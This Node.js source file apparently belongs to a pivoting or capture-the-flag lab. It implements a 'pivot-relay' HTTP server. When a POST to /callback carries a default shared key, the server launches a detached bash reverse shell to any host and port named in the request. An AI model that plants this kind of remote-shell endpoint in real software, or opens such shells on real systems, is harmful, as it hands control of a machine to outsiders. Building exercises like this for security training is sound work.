const http = require('http');
const { exec } = require('child_process');

const PORT = Number.parseInt(process.env.PORT || '8081', 10);
const FLAG_PATH = process.env.PIVOT_FLAG_PATH || '/tmp/rev-pivot-lab/pivot/final-flag.txt';
const PIVOT_KEY = process.env.PIVOT_KEY || 'pivot_local_key';

function writeJson(res, status, body) {
  res.writeHead(status, { 'Content-Type': 'application/json' });
  res.end(`${JSON.stringify(body)}\n`);
}

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.setEncoding('utf8');
    req.on('data', (chunk) => {
      body += chunk;
      if (body.length > 64 * 1024) reject(new Error('request body too large'));
    });
    req.on('end', () => {
      if (!body) {
        resolve({});
        return;
      }
      try {
        resolve(JSON.parse(body));
      } catch (error) {
        reject(error);
      }
    });
    req.on('error', reject);
  });
}

function hostOk(value) {
  return typeof value === 'string' && /^[A-Za-z0-9_.:-]+$/.test(value);
}

function portOk(value) {
  const port = Number.parseInt(String(value), 10);
  return Number.isInteger(port) && port > 0 && port <= 65535;
}

const server = http.createServer(async (req, res) => {
  if (req.method === 'GET' && req.url === '/healthz') {
    writeJson(res, 200, { ok: true });
    return;
  }

  if (req.method === 'GET' && req.url === '/') {
    writeJson(res, 200, {
      service: 'pivot-relay',
      callback: '/callback',
      auth: 'X-Pivot-Key',
      finalFlagPath: FLAG_PATH
    });
    return;
  }

  if (req.method === 'POST' && req.url === '/callback') {
    if (req.headers['x-pivot-key'] !== PIVOT_KEY) {
      writeJson(res, 403, { error: 'missing or invalid X-Pivot-Key' });
      return;
    }

    let payload;
    try {
      payload = await parseBody(req);
    } catch (error) {
      writeJson(res, 400, { error: error.message });
      return;
    }

    if (!hostOk(payload.host) || !portOk(payload.port)) {
      writeJson(res, 400, { error: 'host and port are required' });
      return;
    }

    const command = `setsid bash -lc 'exec bash -i >& /dev/tcp/${payload.host}/${payload.port} 0>&1' </dev/null >/dev/null 2>&1 & disown`;
    exec(command, { shell: '/bin/sh', timeout: 15_000 }, (error) => {
      if (error) console.log(`[pivot-relay] callback launch failed: ${error.message}`);
    });

    writeJson(res, 200, {
      accepted: true,
      finalFlagPath: FLAG_PATH,
      callback: { host: payload.host, port: Number.parseInt(String(payload.port), 10) }
    });
    return;
  }

  writeJson(res, 404, { error: 'not found' });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[pivot-relay] listening on 0.0.0.0:${PORT}`);
});
